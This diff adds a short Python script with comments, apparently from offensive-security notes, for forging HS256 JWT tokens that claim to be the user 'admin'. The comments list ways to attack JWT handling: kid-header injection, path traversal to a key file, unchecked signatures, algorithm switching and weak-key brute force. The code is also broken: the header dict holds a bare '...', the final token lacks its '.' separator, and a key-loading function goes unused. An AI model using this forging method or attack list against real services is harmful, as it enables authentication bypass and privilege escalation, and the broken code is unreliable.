@@ -1,0 +1,34 @@
+#Using the following Python3 code, we can more easily abuse the HMAC  JWT tokens. Normal online tool sunfortunetly struggle with proper signatures and inclussion sof kid values in the header. 
+#This tool breaks it down to a json.dump in bytes before URLsafe Base64 encoding. Use of other tools such as Burpsuite decoder is quicke rto simply decode, alter, etc, the header, but encoding for a proper signature is important and covered here.
+
+# Other issues to look for:
+# Improper use of kernel.open instead of file.open resulting in injection in a kid header.
+# File traveral through the kid header variable pointing to a known location to allow for secret key
+# IMproper validation of signature for various reasons. Just chang ethe data and resubmit with same sig.
+#Changing the Encryption from Asynch to Sych 
+# Use of Sych can result in Brute forcing of Weak Key
+
+
+
+import hmac
+import hashlib
+import json
+import base64
+
+def load_secret_key(filename):
+    with open(filename, 'r') as f:
+        return f.read()
+
+header={"typ":"JWT","alg":"HS256",...}
+
+
+key=""
+payload = {"user":"admin"}
+
+str = base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='utf8')).decode('utf8').rstrip("=")+"."+ base64.urlsafe_b64encode(bytes(json.dumps(payload),encoding='utf8')).decode('utf8').rstrip("=")
+
+sig= base64.urlsafe_b64encode(hmac.new(bytes(key,encoding='utf8'),str.encode('utf8'),hashlib.sha256).digest()).decode('utf8').rstrip('=')
+print (str)
+print (str+sig)
+
+
